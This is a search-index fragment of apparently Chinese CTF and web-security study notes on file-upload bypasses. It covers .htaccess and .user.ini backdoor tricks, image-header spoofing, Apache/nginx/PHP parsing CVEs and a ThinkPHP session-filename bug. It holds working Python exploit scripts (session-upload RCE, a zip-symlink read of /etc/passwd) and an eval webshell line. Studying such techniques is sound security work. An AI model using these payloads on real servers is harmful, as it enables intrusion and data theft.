<p></p>"},{"location":"web_bak/upload/htaccess/#3","title":"3.\u6587\u4ef6\u683c\u5f0f\u68c0\u6d4b","text":"<p>\u5982\u679c\u4f7f\u7528<code>exif_imagetype</code>\u68c0\u6d4b\u4e0a\u4f20\u7684\u6587\u4ef6\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u6765\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\uff0c\u90a3\u4e48\u53ea\u8981\u662f\u56fe\u50cf\u683c\u5f0f\u4ee5<code>#</code>\u6216<code>0x00</code>\u5f00\u5934\u4fbf\u53ef\u7ed5\u8fc7</p> <p>\u65b9\u6cd51</p> <p>\u4f7f\u7528XBM\u56fe\u50cf\uff0c\u4f7f\u7528PHP\u751f\u6210\u56fe\u50cf(\u9700\u5b89\u88c5GD\u5e93)\uff1a</p> <pre><code>&lt;?php// \u521b\u5efa\u7a7a\u767d\u56fe\u50cf\u5e76\u6dfb\u52a0\u6587\u5b57$im = imagecreatetruecolor(120, 20);$text_color = imagecolorallocate($im, 233, 14, 91);imagestring($im, 1, 5, 5,  'A Simple Text String', $text_color);\n// \u4fdd\u5b58\u56fe\u50cfimagexbm($im, '1.png');\n// \u91ca\u653e\u5185\u5b58imagedestroy($im);?&gt;\n</code></pre> <p>(\u4e0b\u9762\u7684<code>1_png_width</code>\u4ee5\u53ca<code>1_png_height</code>\u662f\u6839\u636e\u6587\u4ef6\u540d\u8fdb\u884c\u62fc\u63a5\u751f\u6210\u7684)</p> <p></p> <p>\u90a3\u4e48\u53ef\u4ee5\u5728.htaccess\u524d\u9762\u52a0\u4e0a\uff1a</p> <pre><code>#define 1_png_width 120#define 1_png_height 20\n</code></pre> <p>\u4fbf\u53ef\u7ed5\u8fc7\u5bf9\u6587\u4ef6\u683c\u5f0f\u7684\u68c0\u6d4b</p> <p>\u65b9\u6cd52</p> <p>\u4f7f\u7528WBMP\u56fe\u50cf\uff0c\u4f7f\u7528PHP\u751f\u6210\u56fe\u50cf\uff1a</p> <pre><code>&lt;?php$img = imagecreatetruecolor(20, 20);imagewbmp($img, '1.wbmp');?&gt;\n</code></pre> <p>\u4f7f\u752816\u8fdb\u5236\u7f16\u8f91\u5668\u67e5\u770b\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u79cd\u56fe\u50cf\u683c\u5f0f\u662f\u4ee5<code>0x00</code>\u5f00\u5934\u7684\uff0c\u90a3\u4e48\u4fbf\u53ef\u4ee5\u6b64\u65b9\u5f0f\u7ed5\u8fc7\u5bf9\u6587\u4ef6\u683c\u5f0f\u7684\u68c0\u6d4b</p>"},{"location":"web_bak/upload/htaccess/#4_1","title":"4.\u5176\u4ed6\u5b57\u7b26\u9650\u5236","text":"<p>\u82e5\u8fc7\u6ee4\u4e86<code>&lt;</code>\u3001\u6570\u5b57\u3001<code>:</code>\u7b49\uff0c\u6b64\u65f6\u4fbf\u4e0d\u80fd\u4f7f\u7528<code>php://filter</code>\u6216\u8005UTF\u7f16\u7801\u7684\u65b9\u5f0f\u7ed5\u8fc7\u4e86\uff1b\u53ef\u5c1d\u8bd5\u5229\u7528.htaccess\u8bbe\u7f6e\u5305\u542b\u6307\u5b9a\u7684\u6587\u4ef6\u3002\u4f8b\u5982\u5bf9\u4e8esession\u6587\u4ef6\uff0c\u53ef\u901a\u8fc7\u5305\u542b\u4e0a\u4f20\u6587\u4ef6\u4ea7\u751f\u7684\u4e34\u65f6session\u8fdb\u884cRCE</p> <p>\u67e5\u770b\u914d\u7f6e\u6587\u4ef6\uff0c\u53d1\u73b0\u5927\u90e8\u5206session\u76f8\u5173\u7684\u914d\u7f6e\u90fd\u662f\u53ef\u4ee5\u901a\u8fc7.htaccess\u4fee\u6539\u7684\uff1a</p> <p></p> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5728\u4e0d\u77e5\u9053session\u5b58\u50a8\u8def\u5f84\u7684\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7<code>session.save_path</code>\u6307\u5b9a\u5b58\u50a8\u8def\u5f84\uff0c\u5e76\u4e14\u53ef\u4ee5\u5c06<code>session.upload_progress.cleanup</code>\u8bbe\u7f6e\u4e3aoff\uff0c\u8fd9\u6837\u4fbf\u53ef\u65e0\u9700\u6761\u4ef6\u7ade\u4e89\u6765\u5c06\u4ee3\u7801\u5199\u5230session\u6587\u4ef6\u4e2d\uff0c\u4ece\u800c\u5305\u542brce\uff1b\u7f16\u8f91.htaccess\uff1a</p> <pre><code>php_value auto_append_file \"/tmp/sess_gtfly\"php_value session.save_path \"/tmp\"php_flag session.upload_progress.cleanup off\n</code></pre> <p></p> <p>\u7136\u540e\u8fd0\u884c</p> <pre><code>import requests\nurl='http://127.0.0.1/test.php'\nheaders={    \"Cookie\":'PHPSESSID=gtfly'}\nfiles={    \"upload\":''}\ndata={    \"PHP_SESSION_UPLOAD_PROGRESS\": '''&lt;?php echo system('whoami'); ?&gt;'''     }\nr = requests.session()\nr.post(url,files=files,headers=headers,data=data)\nt = r.get('http://127.0.0.1/test.php',headers=headers)\nprint(t.text)\n</code></pre> <p>\u6210\u529f\u6267\u884c\uff1a</p> <p></p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/","title":"\u6587\u4ef6\u4e0a\u4f20\u8fdb\u9636","text":"<p>\u6240\u4ee5\u6211\u8fd8\u662fcopy\u4e86\uff0c\u6211\u5199\u4e0d\u6765</p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#_2","title":"\u89e3\u6790\u6f0f\u6d1e","text":""},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#apache2","title":"apache2","text":"<p>\u591a\u540e\u7f00\u89e3\u6790\u6f0f\u6d1e</p> <ul> <li>\u5728Apache 2.0.x &lt;= 2.0.59\uff0cApache 2.2.x &lt;= 2.2.17\uff0cApache 2.2.2 &lt;= 2.2.8\u4e2dApache \u89e3\u6790\u6587\u4ef6\u7684\u89c4\u5219\u662f\u4ece\u53f3\u5230\u5de6\u5f00\u59cb\u5224\u65ad\u89e3\u6790,\u5982\u679c\u540e\u7f00\u540d\u4e3a\u4e0d\u53ef\u8bc6\u522b\u6587\u4ef6\u89e3\u6790,\u5c31\u518d\u5f80\u5de6\u5224\u65ad\u3002</li> </ul> <p>\u59821.php.abc\uff0c\u56e0apache2\u4e0d\u8bc6\u522b.abc\u540e\u7f00\uff0c\u6240\u4ee5\u5411\u524d\u89e3\u6790php</p> <p>.htaccess</p> <ul> <li>Apache\u63d0\u4f9b\u4e86\u4e00\u79cd\u5f88\u65b9\u4fbf\u7684\u3001\u53ef\u4f5c\u7528\u4e8e\u5f53\u524d\u76ee\u5f55\u53ca\u5176\u5b50\u76ee\u5f55\u7684\u914d\u7f6e\u6587\u4ef6\u2014\u2014.htaccess\uff08\u5206\u5e03\u5f0f\u914d\u7f6e\u6587\u4ef6\uff09</li> </ul> <p>\u5f53\u7ad9\u70b9\u914d\u7f6e\u4e0a\u6807\u6709AllowOverride All\uff0c\u5e76\u4e14rewrite_mod\u5f00\u542f\u65f6\uff0c.htaccess\u6587\u4ef6\u5c31\u4f1a\u751f\u6548\u3002</p> <p>(1) Options</p> <p>\u5217\u76ee\u5f55</p> <pre><code>Options +Indexes\n</code></pre> <p>\u53ef\u4ee5\u6267\u884ccgi\u7a0b\u5e8f</p> <pre><code>Options ExecCGI\n</code></pre> <p>\u89e3\u6790cgi\u7684\u53c2\u8003\u94fe\u63a5https://www.freebuf.com/vuls/218495.html</p> <p>(2) AddType application/x-httpd-php abc</p> <p>\u5f53\u5728.htaccess\u4e2d\u5199\u5165AddType application/x-httpd-php abc\u65f6\uff0c\u5c31\u4f1a\u628a1.abc\u5f53\u4f5cphp\u6587\u4ef6\u89e3\u6790</p> <p>(3) php_value\u3001php_admin</p> <pre><code>php_flag zend.multibyte 1php_value zend.script_encoding \"UTF-7\"php_value auto_append_file .htaccess+ADw?php phpinfo()+Ads\n</code></pre> <p>UTF-7\u3001UTF-16\u3001UTF-32\u7686\u53ef</p> <p>\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d</p> <pre><code>php_flag engine 0\n</code></pre> <p>\u9664\u6b64\u4e4b\u5916\u8fd8\u53ef\u4ee5\u8fd9\u6837\u4e66\u5199.htaccess</p> <p></p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#_3","title":"\u6587\u4ef6\u4e0a\u4f20\u8fdb\u9636","text":"<p>\u5173\u4e8e\u8fd9\u4e2a\u6211\u81ea\u5df1\u6709\u70b9\u7b14\u8bb0</p> <p>.htaccess\u6587\u4ef6(\u6216\u8005\"\u5206\u5e03\u5f0f\u914d\u7f6e\u6587\u4ef6\"\uff09</p> <p>,\u5168\u79f0\u662fHypertextAccess(\u8d85\u6587\u672c\u5165\u53e3)\u3002\u63d0\u4f9b\u4e86\u9488\u5bf9\u76ee\u5f55\u6539\u53d8\u914d\u7f6e\u7684\u65b9\u6cd5\uff0c \u5373\uff0c\u5728\u4e00\u4e2a\u7279\u5b9a\u7684\u6587\u6863\u76ee\u5f55\u4e2d\u653e\u7f6e\u4e00\u4e2a\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u6307\u4ee4\u7684\u6587\u4ef6\uff0c\u4ee5\u4f5c\u7528\u4e8e\u6b64\u76ee\u5f55\u53ca\u5176\u6240\u6709\u5b50\u76ee\u5f55\u3002\u4f5c\u4e3a\u7528\u6237\uff0c\u6240\u80fd\u4f7f\u7528\u7684\u547d\u4ee4\u53d7\u5230\u9650\u5236\u3002\u7ba1\u7406\u5458\u53ef\u4ee5\u901a\u8fc7Apache\u7684AllowOverride\u6307\u4ee4\u6765\u8bbe\u7f6e\u3002.htaccess\u662f\u4e00\u4e2a\u7eaf\u6587\u672c\u6587\u4ef6\uff0c\u5b58\u653e\u7740\u4e00\u4e9bapache\u6307\u4ee4\uff0c\u4e0ehttpd.conf\u7c7b\u4f3c\uff0c\u4f46\u4f5c\u7528\u8303\u56f4\u4ec5\u9650\u5f53\u524d\u76ee\u5f55\u3002</p> <p>.htaccess\u662f\u5728\u7528\u6237\u8bbf\u95ee\u8be5\u76ee\u5f55\u4e0b\u7684\u7ad9\u70b9\u65f6\u52a0\u8f7d\u7684\uff0c\u4e0d\u9700\u8981\u91cd\u542fapache\u670d\u52a1\u8fdb\u884c\u8f7d\u5165\uff0c\u66f4\u7075\u6d3b\u4f46\u66f4\u8017\u7cfb\u7edf\u8d44\u6e90\u3002\u7531\u4e8e.htaccess\u53ef\u4ee5\u914d\u7f6e\u5f88\u591a\u4e1c\u897f\uff0c\u5982\u76ee\u5f55\u8bbf\u95ee\u3001\u6587\u4ef6\u6267\u884c\u3001\u9519\u8bef\u9875\u9762\u91cd\u5b9a\u5411\u7b49</p> <p>\u7a0d\u5fae\u4e3e\u4e2a\u4f8b\u5b57\uff1a</p> <p> <p>SetHandlerapplication/x-httpd-php</p> <p>//\u6216\u8005\u5e72\u8106\u4e0d\u8981FilesMatch,\u8fd9\u91cc\u7684\u610f\u601d\u662f\u914d\u7f6e\uff0c\u5982\u679c\u5305\u542b1\uff0c\u5219\u5c06\u5176\u89c6\u4e3aphp\u6587\u4ef6\u6267\u884c</p> <p>\u5728PHP\u4e2d\u6709\u4e2a\u5f88\u6709\u8da3\u7684\u4e1c\u897f\u53eb.user.ini\uff0c\u6709\u70b9\u7c7b\u4f3c.htaccess\u6587\u4ef6\uff0cPHP\u4f1a\u5728\u6bcf\u4e2a\u76ee\u5f55\u4e0b\u626b\u63cfINI\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7.user.ini\u6587\u4ef6\u6765\u5b9e\u73b0\u9690\u85cf\u540e\u95e8\u7684\u6548\u679c</p> <p>\u5728.user.ini\u4e2d\u53ef\u4ee5\u8bc6\u522bPHP_INI_PERDIR\u548cPHP_INI_USER\u6a21\u5f0f\u7684INI\u8bbe\u7f6e</p> <p>\u5173\u4e8ePHP_INI_*\u4e00\u5171\u6709\u56db\u79cd\uff1a</p> <p>PHP_INI_USER \u53ef\u5728\u7528\u6237\u811a\u672c\u4ee5\u53ca.user.ini\u4e2d\u8bbe\u5b9a</p> <p>PHP_INI_PERDIR \u53ef\u5728php.ini\uff0c.htaccess\u6216httpd.conf\u4e2d\u8bbe\u5b9a</p> <p>PHP_INI_SYSTEM \u53ef\u5728php.ini\u6216httpd.conf\u4e2d\u8bbe\u5b9a</p> <p>PHP_INI_ALL \u53ef\u5728\u4efb\u4f55\u5730\u65b9\u8bbe\u5b9a</p> <p>auto_prepend_file</p> <p>\u8be5\u914d\u7f6e\u9879\u4f1a\u8ba9php\u6587\u4ef6\u5728\u6267\u884c\u524d\u5148\u5305\u542b\u4e00\u4e2a\u6307\u5b9a\u7684\u6587\u4ef6\uff0c\u901a\u8fc7\u8fd9\u4e2a\u914d\u7f6e\u9879\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6765\u9690\u85cf\u81ea\u5df1\u7684\u540e\u95e8</p> <p>\u5c31\u8fd9\u4e2a\u73a9\u610f\u513f\uff0c\u53ef\u4ee5\u5728\u4e0d\u4e0a\u4f20php\u6587\u4ef6\u7684\u60c5\u51b5\u4e0b\u5236\u9020\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u51fa\u6765</p> <p>\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u6211\u4eec\u4e0a\u4f20\u7684\u6587\u4ef6\u76f4\u63a5\u8986\u76d6\u6389\u4e86\u7cfb\u7edf\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u8fd9\u79cd\u5371\u5bb3\u8fd8\u662f\u975e\u5e38\u5927\u7684\u3002</p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#_4","title":"\u6587\u4ef6\u4e0a\u4f20\u8fdb\u9636","text":"<p>CVE-2017-15715</p> <ul> <li>\u5229\u7528\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u6587\u4ef6\u540d\u4e4b\u540e\u6dfb\u52a0\u4e00\u4e2a\\x0a\u6765\u7ed5\u8fc7\u9ed1\u540d\u5355\u4e0a\u4f20\u7684\u9650\u5236</li> </ul>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#nginx","title":"nginx","text":"<p>CVE-2013-4547</p> <ul> <li>\u53c2\u8003https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547</li> </ul> <p>\u5373\u4e0a\u4f20\u4e00\u4e2a1.gif\uff0c\u7136\u540e\u8bbf\u95ee1.gif[0x20][0x00].php([0x20][0x00]\u4e3a\u7a7a\u683c\u548c\\0\u4e0d\u9700\u8981url\u7f16\u7801)\uff0c1.gif\u4f1a\u88ab\u5f53\u4f5cphp\u89e3\u6790</p> <p>php-cgi\u6f0f\u6d1e</p> <ul> <li>\u5728php\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u5f00\u542f\u4e86cgi.fix_pathinfo\uff0c\u5bfc\u81f4\u56fe\u7247\u9a6c1.jpg\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee1.jpg/.php\u89e3\u6790\u6210php</li> </ul> <p>.user.ini</p> <ul> <li>\u5f53\u4f7f\u7528CGI\uff0fFastCGI \u6765\u89e3\u6790php\u65f6\uff0cphp\u4f1a\u4f18\u5148\u641c\u7d22\u76ee\u5f55\u4e0b\u6240\u6709\u7684.ini\u6587\u4ef6\uff0c\u5e76\u5e94\u7528\u5176\u4e2d\u7684\u914d\u7f6e\u3002\u7c7b\u4f3c\u4e8eapache\u7684.htaccess\uff0c\u4f46\u8bed\u6cd5\u4e0e.htacces\u4e0d\u540c\uff0c\u8bed\u6cd5\u4e0ephp.ini\u4e00\u81f4\u3002\u56e0nginx\u5b9e\u9645\u4e0a\u53ea\u662f\u8d77\u5230\u8f6c\u53d1\u7684\u4f5c\u7528\uff0c\u5b9e\u9645\u89e3\u6790\u4e00\u822c\u4e3aphp-fpm\u6216fastcgi\u6765\u89e3\u6790\uff0c\u6240\u4ee5\u5728.user.ini\u4e2d\u5199\u5982auto_prepend_file=test.jpg\uff0c\u4e4b\u540e\u4e0a\u4f20.user.ini\u4e0etest.jpg\uff0c\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7b49\u5f85.user.ini\u88ab\u52a0\u8f7d\u540e\uff0c\u4f1a\u5bfc\u81f4\u6bcf\u4e2aphp\u6587\u4ef6\u89e3\u6790\u4e4b\u524d\u5148\u5c06test.jpg\u5f53\u4f5cphp\u89e3\u6790\u3002</li> </ul>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#php","title":"php","text":"<p>00\u622a\u65ad</p> <p>php \u7248\u672c\u4e3a5.2.x\uff0c\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\u5728\u6587\u4ef6\u540e\u540d\u540e\u8ffd\u52a0\\0\u5373\u53ef\u8ba9\u4e0a\u4f20\u7684\u6587\u4ef6\uff0c\u6700\u7ec8\u53d8\u4e3a\u4ee5.php\u7ed3\u5c3e\u7684\u6587\u4ef6</p> <p>fopen\u7279\u6027</p> <pre><code>&lt;?php$filename='shell.php/.';$content=\"&lt;?php phpinfo();\";$f = fopen($filename, 'w');    fwrite($f, $content);    fclose($f);?&gt; //\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u751f\u6210shell.php\n</code></pre> <p>\u8fd9\u4e2a\u770b\u8d77\u6765\u597d\u7528\uff0c\u5b9e\u9645\u4e0a\u5012\u6ca1\u6709\u7528\u7684\u90a3\u4e48\u591a\uff0c\u8fd9\u4e2a\u662fphp\u8bed\u8a00\u7684\u89e3\u6790\u6f0f\u6d1e\u3002</p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#zip","title":"zip\u8f6f\u94fe\u63a5\u6267\u884c\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":"<pre><code>#coding=utf-8\nimport os\nimport requests\nimport sys\nurl = ''\ndef makezip():\nos.system('ln -s '+sys.argv[1]+' exp')\nos.system('zip --symlinks exp.zip exp')\nmakezip()\nfiles = {'the_file':open('./exp.zip','rb')}\ndef exploit():\nres = requests.post(url,files=files)\nprint(res.text)\nexploit()\nos.system('rm -rf exp')\nos.system('rm -rf exp.zip')\n</code></pre> <p>\u5148copy\u4e00\u4e0b\u6240\u7528\u5230\u7684\u811a\u672c\u539f\u7406\u4e4b\u540e\u518d\u89e3\u91ca</p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#_5","title":"\u6587\u4ef6\u4e0a\u4f20\u8fdb\u9636","text":"<p>\u539f\u7406\u5f88\u7b80\u5355\uff0c\u5229\u7528linux\u91cc\u9762\u7684\u8f6f\u94fe\u63a5\u6765\u94fe\u63a5\u5f53\u524d\u7528\u6237\u4e0b\u7684\u6587\u6863\uff0c\u7136\u540e\u5f53\u6211\u4eec\u8bfb\u53d6\u8bbf\u95ee\u65f6\u4f1a\u663e\u793a\u6587\u4ef6\u4e2d\uff08\u5305\u62ec\u8def\u5f84\u4e2d\u7684\uff09\u5185\u5bb9\uff0c\u76f8\u5f53\u4e8e\u6587\u4ef6\u4e0a\u4f20\u540e\u8fbe\u6210\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u3002</p> <p>\u81f3\u4e8e\u8f6f\u94fe\u63a5\uff0c\u76f4\u63a5\u7406\u89e3\u7c7b\u4f3cwindows\u4e0b\u7684\u5feb\u6377\u65b9\u5f0f\uff0c\u6027\u8d28\u4e0a\u4f1a\u6709\u70b9\u4e0d\u540c</p> <p>\u5e73\u5e38\u7ecf\u5e38\u4f1a\u4f7f\u7528\u7684\u547d\u4ee4\u5c31\u662f</p> <p>ln -s \u8def\u5f84a \u8def\u5f84b\uff0c \u4e5f\u4f1a\u4e00\u822c\u7528\u4e8e\u5c06\u4f60\u81ea\u5b9a\u4e49\u7684\u53ef\u6267\u884c\u6587\u4ef6\u653e\u5230\u7cfb\u7edf\u547d\u4ee4\u4e2d\uff0c\u4e4b\u540e\u6309tab\u53ef\u4ee5\u8865\u5168</p> <p>\u4e0a\u9762\u811a\u672c\u7684\u5229\u7528\u65b9\u5f0f\u4e3a</p> <p>python3 jiaoben /etc/passwd/</p> <p>\u53ef\u4ee5\u8bfb\u53d6\u5230\u8def\u5f84\u5185\u5185\u5bb9</p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#thinkphp600-601","title":"Thinkphp6.0.0--6.0.1\u6587\u4ef6\u540d\u4e0a\u4f20\u6f0f\u6d1e","text":"<p>thinkphp\u7684\u6f0f\u6d1e\u611f\u89c9\u786e\u5b9e\u662f\u5f88\u591a\u3002</p> <p>\u7b80\u5355\u7684\u6982\u62ec\u5c31\u662f\u7531\u4e8e\u5b83\u81ea\u5df1\u7684\u4ee3\u7801\u903b\u8f91\u6709\u95ee\u9898\uff0c\u5bfc\u81f4\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\u79f0\uff0c\u5728\u67d0\u4e9b\u7279\u5b9a\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u62ff\u5230shell</p> <p>2020\u5e741\u670810\u65e5\uff0cThinkPHP\u56e2\u961f\u53d1\u5e03\u4e00\u4e2a\u8865\u4e01\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u5904\u7531\u4e0d\u5b89\u5168\u7684SessionId\u5bfc\u81f4\u7684\u4efb\u610f\u6587\u4ef6\u64cd\u4f5c\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005\u5728\u76ee\u6807\u73af\u5883\u542f\u7528session\u7684\u6761\u4ef6\u4e0b\u521b\u5efa\u4efb\u610f\u6587\u4ef6\u4ee5\u53ca\u5220\u9664\u4efb\u610f\u6587\u4ef6\uff0c\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u8fd8\u53ef\u4ee5getshell\u3002</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>\u800c<code>$sessionId</code>\u662fcookie\u4e2d\u540d\u4e3aPHPSESSID\u7684\u503c\uff0c\u56e0\u6b64\u662f\u653b\u51fb\u8005\u53ef\u63a7\u7684\uff0c\u4ece\u800c\u5bfc\u81f4\u5199\u5165\u7684\u6587\u4ef6\u540d\u53ef\u63a7\u3002</p> <p>\u539f\u7406\u9898\uff1a</p> <p>[GYCTF2020]EasyThinking</p> <p>\u9996\u5148\u6253\u5f00\u9898\u76ee\u6ce8\u518c\u540e\u5728url\u4e0a\u4e71\u8f93\u4e86\u4e00\u901a\uff1a</p> <p></p> <p>get\u5230\u4e86\u6846\u67b6\u7684\u7248\u672c\uff0c\u76f4\u89c9\u544a\u8bc9\u6211\u4eec\u4e00\u822c\u90fd\u662f\u67d0\u4e2a\u8865\u4e01\u3002\u641c\u5230\u4e86\u4e0a\u9762\u7684thinkphp6.0.0\u7684\u6587\u4ef6\u540d\u4e0a\u4f20\u3002</p> <p>\u7136\u540e\u8fd8\u6709\u4e00\u4e2asearch\u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u80fd\u591fpost\u6570\u636e\u4e0a\u53bb\u3002</p> <p></p> <p>\u81f3\u4e8e\u4fdd\u5b58\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e2awww.zip\u53ef\u4ee5\u770b\u5230\u3002</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f\u6b63\u5e38\u60c5\u51b5\u4e0b\u90a3\u5c31\u7528\u8681\u5251\u6765\u8fde\u63a5\uff0c\u8fde\u63a5\u4e4b\u540e\u7684\u754c\u9762\u8fd9\u6837\uff0c\u6709\u4e2a./readflag\uff0c\u4f46\u7531\u4e8e\u662fdisable_function\uff0c\u4e00\u822c\u547d\u4ee4\u90fd\u8fc7\u4e0d\u4e86\u3002</p> <p>\u4e4b\u540e\u7528\u5230ld_preload\u8fdb\u7a0b\u6ce8\u5165\u7684\u7ed5\u8fc7\uff0c\u539f\u7406\u4e4b\u524d\u505a\u679c\u4e00\u4e9b\u603b\u7ed3\uff0c\u8fd9\u91cc\u4e0d\u8d58\u8ff0\uff0c\u76f4\u63a5\u7528\u8681\u5251\u4e0a\u7684\u63d2\u4ef6\u3002</p> <p></p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/","title":"\u6587\u4ef6\u4e0a\u4f20\u57fa\u7840","text":"<p>[\u6781\u5ba2\u5927\u6311\u6218 2019]Upload</p> <p>\u4e0d\u662f\u7279\u522b\u597d\u5199\u5165\u95e8\u7ea7\u7684\u603b\u7ed3\uff0c\u5148\u62ff\u4e2a\u4f8b\u5b50\u6765\u505a\u505a</p> <p></p> <p>\u968f\u4fbf\u62ff\u5f20\u56fe\u7247\u4e0a\u4f20\u6293\u5305\u3002\u4e0a\u4f20\u53d1\u73b0\u4e0d\u6210\u529f\uff08\u6211\u660e\u660e\u62ff\u7684\u662f\u4e00\u5f20\u56fe\u7247\uff09</p> <p>\u90a3\u5c31\u770b\u770b\u5b83\u8fc7\u6ee4\u70b9\u5728\u54ea\u3002</p> <p>\u5f04\u4e2a\u80fd\u4e0a\u4f20\u7684\u6587\u4ef6\u7136\u540e\u4fee\u6539\u4e0a\u4f20\u5185\u5bb9\u4e3a</p> <p></p> <p>\u4f46\u662f\u540e\u7f00\u540d\u4e3ajepg\u80af\u5b9a\u662f\u4e0d\u80fd\u89e3\u6790\u6267\u884c\u7684\uff0c\u4f46\u5c1d\u8bd5php\u4e5f\u4e0d\u884c</p> <p>\u6700\u7ec8\u4e3aphtml\uff1a\u8001\u7248\u672cphp\u7684\u4e00\u79cd\u540e\u7f00\u683c\u5f0f</p> <p>\u4e0a\u4f20\u6728\u9a6c\u6210\u529f</p> <p>\u987a\u4fbf\u63d0\u4e00\u53e5\uff1aGIF89a</p> <p>GIF89a\u56fe\u7247\u5934\u6587\u4ef6\u6b3a\u9a97\uff0c\u662f\u4e00\u79cd\u653b\u51fb\uff0cGIF89a\u56fe\u5f62\u6587\u4ef6\u662f\u4e00\u4e2a\u6839\u636e\u56fe\u5f62\u4ea4\u6362\u683c\u5f0f\uff08GIF\uff0989a\u7248\u8fdb\u884c\u683c\u5f0f\u5316\u4e4b\u540e\u7684\u56fe\u5f62\u3002</p> <p>\u6709\u7684\u670d\u52a1\u5668\u89e3\u6790\u4e0d\u4e00\u5b9a\u662f\u8fd9\u4e2a\u6bd4\u5982\u67d0\u4e9b\u8bc6\u522b\u7684\u662fPNG\u7684\u6587\u4ef6\u5934\uff0c\u4e5f\u5c31\u662f\u90a3\u4e2aGIF89a\u6539\u6210PNG</p> <p>\u6587\u4ef6\u4e0a\u4f20\u7684\u57fa\u672c\u4fee\u6539\u7684\u53c2\u6570\u5c31\u662f\u56fe\u4e2d\u7684</p> <p>filename\u7684\u540e\u7f00</p> <ul> <li> <p>Content-Type\u7684\u683c\u5f0f\uff0c\u4e00\u822c\u4fee\u6539\u4e3aimage/jpeg\uff0c\u89c6\u60c5\u51b5\u800c\u5b9a</p> </li> <li> <p>\u6587\u4ef6\u5934</p> </li> <li> <p>\u4e0a\u4f20\u6570\u636e\u7684\u5185\u5bb9\uff0c\u6bd4\u5982\u8fd9\u9898\u5c31\u8fc7\u6ee4\u4e86\"&lt;?\"\u5bfc\u81f4&lt;?php @eval($_POST(\"aa\"));?&gt;\u7528\u4e0d\u4e86</p> </li> <li> <p>\u7136\u540e\u662f\u731c\u6587\u4ef6\u4e0a\u4f20\u7684\u8def\u5f84\uff08\u4e5f\u53ef\u4ee5\u8def\u5f84\u626b\u63cf\u626b\u540e\u592a\u626b\u51fa\u6765\uff09\uff0c\u6211\u4eec\u8bbf\u95ee\u5b83\uff08\u76f8\u5f53\u4e8e\u8c03\u7528\u5b83\u5f53\u4f5cphp\u6587\u4ef6\u6267\u884c\uff09\u540e\u6253\u5f00\u4e86\u4e00\u4e2a\u53cd\u5f39\u7684shell</p> </li> </ul> <p>\u7136\u540e\u4e0a\u4f20\u7684\u8def\u5f84\u4e00\u822c\u4e3aupload/\u6587\u4ef6\u540d       uploaded/\u6587\u4ef6\u540d</p> <p>\uff08\u5c31\u8ddf\u731c\u6d4b\u7ba1\u7406\u5458\u7684\u7528\u6237\u540d\u79f0\u4e3aadmin\u662f\u4e00\u4e2a\u9053\u7406\uff09</p> <p>\u8fd9\u91cc\u662f/upload/a.phtml\u627e\u5230\u540e\u8fde\u63a5\uff0c\u76f8\u5f53\u4e8e\u4f60\u5df2\u7ecf\u62ff\u5230\u4e86\u76ee\u6807\u7cfb\u7edf\u7684\u63a7\u5236\u6743\u9650</p> <p></p> 